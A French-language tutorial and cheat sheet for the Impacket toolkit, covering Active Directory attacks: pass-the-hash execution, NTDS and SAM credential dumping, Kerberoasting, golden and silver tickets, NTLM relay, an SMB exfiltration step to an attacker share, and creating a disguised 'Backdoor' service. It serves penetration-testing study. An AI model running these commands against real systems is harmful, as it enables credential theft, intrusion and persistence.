# 🐍 Impacket - Guide Complet

Suite d'outils Python pour l'interaction avec les protocoles réseau Windows.

---

## 📖 Présentation

**Impacket** est une collection de classes Python pour travailler avec les protocoles réseau. C'est l'outil indispensable pour le pentest Active Directory et Windows.

```
Protocoles supportés:
├── SMB/CIFS
├── MSRPC
├── NTLM
├── Kerberos
├── LDAP
├── MSSQL
└── WMI
```

---

## 🔧 Installation

```bash
# Via pip
pip install impacket

# Depuis les sources (dernière version)
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .

# Kali Linux (pré-installé)
locate impacket | head -5
# /usr/share/doc/python3-impacket/

# Les scripts sont dans:
ls /usr/bin/*impacket* 2>/dev/null || ls /usr/share/doc/python3-impacket/examples/
```

---

## 1️⃣ Exécution de Commandes

### psexec.py

**Exécution de commandes via SMB (nécessite ADMIN$).**

```bash
# Avec mot de passe
impacket-psexec domain/user:password@TARGET

# Avec hash NTLM (Pass-the-Hash)
impacket-psexec -hashes :NTLM_HASH domain/user@TARGET

# Avec hash complet LM:NT
impacket-psexec -hashes LM_HASH:NT_HASH domain/user@TARGET

# Exécuter une commande spécifique
impacket-psexec domain/user:password@TARGET "whoami /all"

# Spécifier le partage
impacket-psexec -share ADMIN$ domain/user:password@TARGET
```

### wmiexec.py

**Exécution via WMI (plus discret, pas de service créé).**

```bash
# Shell interactif
impacket-wmiexec domain/user:password@TARGET

# Avec hash
impacket-wmiexec -hashes :NTLM_HASH domain/user@TARGET

# Commande unique
impacket-wmiexec domain/user:password@TARGET "hostname"

# Sans output (blind)
impacket-wmiexec -nooutput domain/user:password@TARGET "net user hacker P@ss /add"
```

### smbexec.py

**Exécution via SMB (alternative à psexec).**

```bash
# Shell interactif
impacket-smbexec domain/user:password@TARGET

# Avec hash
impacket-smbexec -hashes :NTLM_HASH domain/user@TARGET

# Mode silencieux
impacket-smbexec -mode SHARE domain/user:password@TARGET
```

### atexec.py

**Exécution via Task Scheduler.**

```bash
# Exécuter une commande
impacket-atexec domain/user:password@TARGET "whoami"

# Avec hash
impacket-atexec -hashes :NTLM_HASH domain/user@TARGET "hostname"
```

### dcomexec.py

**Exécution via DCOM (MMC20, ShellWindows, ShellBrowserWindow).**

```bash
# Utiliser MMC20
impacket-dcomexec -object MMC20 domain/user:password@TARGET

# Utiliser ShellWindows
impacket-dcomexec -object ShellWindows domain/user:password@TARGET

# Avec hash
impacket-dcomexec -hashes :NTLM_HASH -object MMC20 domain/user@TARGET
```

---

## 2️⃣ Extraction de Credentials

### secretsdump.py

**L'outil le plus puissant pour extraire des credentials.**

```bash
# Dump local (SAM, LSA, NTDS)
impacket-secretsdump domain/user:password@TARGET

# Avec hash (Pass-the-Hash)
impacket-secretsdump -hashes :NTLM_HASH domain/user@TARGET

# Dump uniquement NTDS (Active Directory)
impacket-secretsdump -just-dc domain/admin:password@DC_IP

# Dump NTDS avec historique
impacket-secretsdump -just-dc-ntlm -history domain/admin:password@DC_IP

# Dump depuis fichiers locaux
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Dump NTDS offline
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Output vers fichier
impacket-secretsdump domain/user:password@TARGET -outputfile dump
```

### Output secretsdump

```
# Format des hashes récupérés:
Utilisateur:RID:LM_Hash:NT_Hash:::

# Exemple:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Le hash NT est celui utilisé pour Pass-the-Hash
```

---

## 3️⃣ Attaques Kerberos

### GetNPUsers.py (AS-REP Roasting)

**Récupérer les TGT des comptes sans pré-authentification.**

```bash
# Avec liste d'utilisateurs
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP

# Utilisateur unique
impacket-GetNPUsers domain.local/username -no-pass -dc-ip DC_IP

# Énumérer et attaquer automatiquement
impacket-GetNPUsers domain.local/ -dc-ip DC_IP -request

# Avec credentials (énumère les users vulnérables)
impacket-GetNPUsers domain.local/user:password -dc-ip DC_IP -request

# Format hashcat
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP -format hashcat
```

### GetUserSPNs.py (Kerberoasting)

**Récupérer les TGS des comptes de service.**

```bash
# Énumérer les SPNs
impacket-GetUserSPNs domain.local/user:password -dc-ip DC_IP

# Récupérer les tickets
impacket-GetUserSPNs domain.local/user:password -dc-ip DC_IP -request

# Output fichier pour hashcat
impacket-GetUserSPNs domain.local/user:password -dc-ip DC_IP -request -outputfile kerberoast.txt

# Avec hash
impacket-GetUserSPNs -hashes :NTLM_HASH domain.local/user -dc-ip DC_IP -request
```

### ticketer.py (Golden/Silver Ticket)

**Créer des tickets Kerberos forgés.**

```bash
# Golden Ticket (nécessite le hash krbtgt)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator

# Silver Ticket (pour un service spécifique)
impacket-ticketer -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn CIFS/target.domain.local Administrator

# Utiliser le ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@TARGET
```

### getTGT.py

**Obtenir un TGT avec credentials.**

```bash
# Avec mot de passe
impacket-getTGT domain.local/user:password

# Avec hash
impacket-getTGT -hashes :NTLM_HASH domain.local/user

# Avec AES key
impacket-getTGT -aesKey AES256_KEY domain.local/user

# Utiliser le TGT
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain.local/user@TARGET
```

### getST.py

**Obtenir un Service Ticket (TGS).**

```bash
# Demander un TGS
impacket-getST -spn CIFS/target.domain.local domain.local/user:password

# S4U2Self (impersonation)
impacket-getST -spn CIFS/target.domain.local -impersonate Administrator domain.local/user:password

# Utiliser
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass //target.domain.local/C$
```

---

## 4️⃣ Énumération SMB/LDAP

### smbclient.py

**Client SMB interactif.**

```bash
# Connexion
impacket-smbclient domain/user:password@TARGET

# Avec hash
impacket-smbclient -hashes :NTLM_HASH domain/user@TARGET

# Commandes utiles dans le shell:
# shares        - Lister les partages
# use C$        - Se connecter à un partage
# ls            - Lister les fichiers
# get file.txt  - Télécharger
# put file.txt  - Uploader
```

### lookupsid.py

**Énumérer les SIDs et utilisateurs.**

```bash
# Brute force SIDs
impacket-lookupsid domain/user:password@TARGET

# Range personnalisé
impacket-lookupsid domain/user:password@TARGET 500-600

# Anonyme (si autorisé)
impacket-lookupsid anonymous@TARGET -no-pass
```

### samrdump.py

**Dump des infos SAM via MSRPC.**

```bash
# Énumérer utilisateurs et groupes
impacket-samrdump domain/user:password@TARGET

# Avec hash
impacket-samrdump -hashes :NTLM_HASH domain/user@TARGET
```

### GetADUsers.py

**Énumérer les utilisateurs AD via LDAP.**

```bash
# Lister tous les utilisateurs
impacket-GetADUsers -all domain.local/user:password -dc-ip DC_IP

# Filtrer
impacket-GetADUsers domain.local/user:password -dc-ip DC_IP
```

---

## 5️⃣ Services Réseau

### smbserver.py

**Créer un serveur SMB local.**

```bash
# Serveur simple
impacket-smbserver SHARE /path/to/share

# Avec authentification
impacket-smbserver -username user -password pass SHARE /path/to/share

# Support SMB2
impacket-smbserver -smb2support SHARE /path/to/share

# Cas d'usage: exfiltration
impacket-smbserver -smb2support share $(pwd)
# Sur la cible: copy file.txt \\ATTACKER\share\
```

### ntlmrelayx.py

**Relayer les authentifications NTLM.**

```bash
# Relay vers SMB
impacket-ntlmrelayx -t TARGET -smb2support

# Relay vers LDAP
impacket-ntlmrelayx -t ldap://DC_IP --escalate-user user

# Avec liste de cibles
impacket-ntlmrelayx -tf targets.txt -smb2support

# Exécuter une commande
impacket-ntlmrelayx -t TARGET -smb2support -c "whoami > C:\proof.txt"

# Dump SAM
impacket-ntlmrelayx -t TARGET -smb2support --sam
```

### mssqlclient.py

**Client MSSQL interactif.**

```bash
# Connexion
impacket-mssqlclient domain/user:password@TARGET

# Windows auth
impacket-mssqlclient domain/user:password@TARGET -windows-auth

# Commandes utiles:
# enable_xp_cmdshell
# xp_cmdshell whoami
# sp_configure "show advanced options", 1
```

---

## 6️⃣ Autres Outils Utiles

### reg.py

**Lecture/écriture de la registry à distance.**

```bash
# Lire une valeur
impacket-reg domain/user:password@TARGET query -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion

# Sauvegarder SAM/SYSTEM
impacket-reg domain/user:password@TARGET save -keyName HKLM\\SAM -o sam.save
impacket-reg domain/user:password@TARGET save -keyName HKLM\\SYSTEM -o system.save
```

### services.py

**Gestion des services Windows.**

```bash
# Lister les services
impacket-services domain/user:password@TARGET list

# Démarrer un service
impacket-services domain/user:password@TARGET start -name ServiceName

# Créer un service
impacket-services domain/user:password@TARGET create -name Backdoor -display "Legit Service" -path "C:\shell.exe"
```

### rpcdump.py

**Énumérer les endpoints RPC.**

```bash
impacket-rpcdump domain/user:password@TARGET
```

### addcomputer.py

**Ajouter un ordinateur au domaine.**

```bash
impacket-addcomputer -computer-name FAKE$ -computer-pass P@ssword123 domain.local/user:password -dc-ip DC_IP
```

---

## 🔑 Authentification - Récapitulatif

```bash
# Mot de passe
domain/user:password@TARGET

# Hash NTLM (Pass-the-Hash)
-hashes :NT_HASH domain/user@TARGET

# Hash complet
-hashes LM_HASH:NT_HASH domain/user@TARGET

# Kerberos (avec .ccache)
export KRB5CCNAME=ticket.ccache
-k -no-pass domain/user@TARGET

# AES Key
-aesKey AES256_KEY domain/user@TARGET

# Null session
-no-pass domain/''@TARGET
```

---

## 📋 Cheatsheet Rapide

```bash
# Execution
impacket-psexec domain/user:password@TARGET
impacket-wmiexec domain/user:password@TARGET
impacket-smbexec domain/user:password@TARGET

# Dump credentials
impacket-secretsdump domain/user:password@TARGET
impacket-secretsdump -just-dc domain/admin:password@DC

# Kerberos attacks
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip DC
impacket-GetUserSPNs domain.local/user:password -dc-ip DC -request

# Pass-the-Hash
impacket-psexec -hashes :HASH domain/user@TARGET
impacket-secretsdump -hashes :HASH domain/user@TARGET

# SMB
impacket-smbclient domain/user:password@TARGET
impacket-smbserver -smb2support share .

# NTLM Relay
impacket-ntlmrelayx -t TARGET -smb2support
```

---

## 📚 Ressources

- **GitHub Officiel** : https://github.com/fortra/impacket
- **Documentation** : https://www.secureauth.com/labs/open-source-tools/impacket/
- **Wiki** : https://tools.thehacker.recipes/impacket

---

**Tags:** `#impacket #activedirectory #windows #kerberos #smb #passthehash #secretsdump #lateral-movement`
